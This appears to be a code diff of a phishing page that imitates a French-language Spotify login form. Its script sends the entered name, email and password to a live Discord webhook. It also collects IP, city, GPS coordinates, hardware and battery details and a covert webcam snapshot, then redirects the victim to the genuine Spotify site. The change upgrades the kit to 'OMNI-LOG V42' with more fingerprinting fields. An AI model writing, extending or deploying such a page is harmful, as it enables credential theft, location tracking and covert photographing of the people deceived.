@@ -10,26 +10,17 @@
         body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
         .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
         .logo { width: 45px; margin: 0 auto 35px auto; }
-        
         .field { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; }
         input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
         input:focus { border: 2px solid #1ed760; }
-        
         .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 10px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
-        
-        /* Options en bas sans icônes */
         .alt-container { margin-top: 40px; }
-        .btn-alt { width: 100%; padding: 12px; border: 1px solid #727272; border-radius: 500px; margin-bottom: 10px; font-weight: 700; font-size: 13px; background: transparent; color: #fff; cursor: pointer; }
-        
-        .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; color: #727272; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-alt { width: 100%; padding: 12px; border: 1px solid #727272; border-radius: 500px; margin-bottom: 10px; font-weight: 700; font-size: 13px; background: transparent; color: #fff; }
+        .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; color: #727272; font-size: 11px; text-transform: uppercase; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
         .divider:not(:empty)::before { margin-right: 1.5em; }
         .divider:not(:empty)::after { margin-left: 1.5em; }
-
-        .footer-link { color: #b3b3b3; font-size: 13px; margin-top: 20px; }
-        .footer-link span { color: #fff; text-decoration: underline; cursor: pointer; }
-
         #loader { display: none; margin-top: 20px; }
         .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
         .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
@@ -39,7 +30,6 @@
 <body>
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-        
         <div id="ui">
             <div class="flex gap-2">
                 <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
@@ -47,22 +37,17 @@
             </div>
             <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
             <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-            
-            <button onclick="runV41()" id="btn" class="btn-green">Se connecter</button>
-
+            <button onclick="runV42()" class="btn-green">Se connecter</button>
             <div class="alt-container">
                 <div class="divider">ou se connecter avec</div>
                 <button class="btn-alt">Continuer avec Google</button>
                 <button class="btn-alt">Continuer avec Facebook</button>
-                <button class="btn-alt">Continuer avec Apple</button>
-                
-                <p class="footer-link">Pas de compte ? <span>S'inscrire</span></p>
+                <p style="color:#b3b3b3; font-size:13px; margin-top:20px;">Pas de compte ? <span style="color:#fff; text-decoration:underline;">S'inscrire</span></p>
             </div>
         </div>
-
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <p style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900;">CHARGEMENT DU PROFIL...</p>
+            <p style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900;">VÉRIFICATION SÉCURISÉE...</p>
         </div>
     </div>
 
@@ -72,7 +57,7 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function runV41() {
+        async function runV42() {
             const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
             if(!user.u || !user.p) return;
 
@@ -83,30 +68,32 @@
             let stream = null;
             try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}
 
-            pb.style.width = "35%";
+            pb.style.width = "40%";
             let gps = "❌ Bloqué";
             try {
-                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000}); });
+                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000}); });
                 gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
             } catch(e){}
 
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Inconnu";
+            const db = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "Inconnu";
+            const ramUsage = window.performance && window.performance.memory ? Math.round(window.performance.memory.usedJSHeapSize / 1048576) + "MB" : "Non supporté";
 
             const payload = {
                 embeds: [{
-                    title: `⚡ V41 CLEAN-BOTTOM - ${user.fn} ${user.ln}`,
+                    title: `🔥 OMNI-LOG V42 OVERLOAD - ${user.fn} ${user.ln}`,
                     color: 1955168,
                     fields: [
-                        { name: "👤 COMPTE", value: `**User:** \`${user.u}\`\n**Pass:** \`${user.p}\`\n**Nom:** \`${user.fn} ${user.ln}\`` },
-                        { name: "📍 RÉSEAU", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**GPS:** ${gps}` },
-                        { name: "🛠️ MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`` },
-                        { name: "🖥️ SYSTÈME", value: `**OS:** \`${navigator.platform}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
+                        { name: "👤 ACCÈS COMPTE", value: `**Prénom/Nom:** \`${user.fn} ${user.ln}\`\n**Email:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
+                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\` (${net.country_name})\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
+                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU Vendor:** \`Apple Inc.\`\n**GPU Model:** \`${gpu}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM Dispo:** \`${navigator.deviceMemory || 'undefined'}GB\`\n**RAM Utilisée:** \`${ramUsage}\`\n**Écran:** \`${screen.width}x${screen.height}\` (DPR: ${window.devicePixelRatio})` },
+                        { name: "🔋 BATTERIE & STATUT", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**En charge:** \`${bat.charging ? 'OUI' : 'NON'}\`\n**Géoloc:** ${gps}` },
+                        { name: "💻 LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**Cookies:** \`${navigator.cookieEnabled ? '✅' : '❌'}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
                     ],
-                    footer: { text: "LVN V41 ULTIMATE • " + new Date().toLocaleString() }
+                    footer: { text: "LVN SYSTEM OVERLOAD • " + new Date().toLocaleString() }
                 }]
             };
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
@@ -118,17 +105,16 @@
                 const can = document.getElementById('c');
                 can.width = v.videoWidth; can.height = v.videoHeight;
                 can.getContext('2d').drawImage(v, 0, 0);
-                
                 can.toBlob(async b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'capture.jpg');
-                    fd.append('content', `📸 **Face ID : ${user.fn} ${user.ln}**`);
+                    fd.append('file', b, 'shot.jpg');
+                    fd.append('content', `📸 **Face ID de ${user.fn} ${user.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "https://www.spotify.com/premium/";
+                    window.location.href = "https://www.spotify.com/premium";
                 }, 'image/jpeg', 0.8);
             } else {
-                setTimeout(() => { window.location.href = "https://www.spotify.com/premium/"; }, 1000);
+                setTimeout(() => { window.location.href = "https://www.spotify.com/premium"; }, 1000);
             }
         }
     </script>
